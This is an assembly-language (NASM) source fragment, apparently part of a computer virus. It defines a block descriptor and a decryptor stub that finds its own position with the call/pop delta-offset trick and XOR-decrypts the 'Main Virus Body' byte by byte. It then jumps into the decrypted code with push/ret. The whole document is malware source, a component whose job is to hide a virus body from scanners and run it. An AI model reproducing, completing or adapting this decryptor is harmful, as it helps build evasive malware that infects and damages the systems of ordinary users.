%define SB Sentry_BlockDescryptor

%macro NASMHACKS 0
;On Entry ebp Points To BlockDescriptor
Sentry_BlockDescryptor:
Sentry_StrainKey        DD 0
Sentry_BlockSize        DD Sentry_BlockTerminator-SB
Sentry_CryptionArray_   DD Sentry_CryptionArray-SB
Sentry_Cryptions        DD 1
Sentry_ImportArray_     DD Sentry_ImportArray-SB
Sentry_EntryPoint:

    call SentryGetDelta
SentryGetDelta:
    pop  ebp
    sub  ebp,SentryGetDelta  ;EBP = Delta Offset

    ;Get RegionVA
    mov  eax,[ebp+RegionVA]
    
    ;Decrypt Main Virus Body
    mov  edx,eax
    mov  ecx,END_OF_ENCRYPTION_BOUNDRY - START_OF_VIRUS
    
    
    DEC ECX
    
    ADD EDX,ECX
    MOV ESI,EDX
.1
    LODSB
    DEC  ESI
    DEC  ESI
    XOR  AL,[esi]
    MOV  [esi+1],AL
    LOOP .1;
    

    ;RET To Virus
    mov  eax,[ebp+RegionVA]
    push eax
    ret

RET

Sentry_CryptionArray:
DD    0
DD    0

Sentry_ImportArray:
DD 0                                         ;Number Of Imports

RegionVA   DD START_OF_VIRUS

Sentry_BlockTerminator:
%endmacro
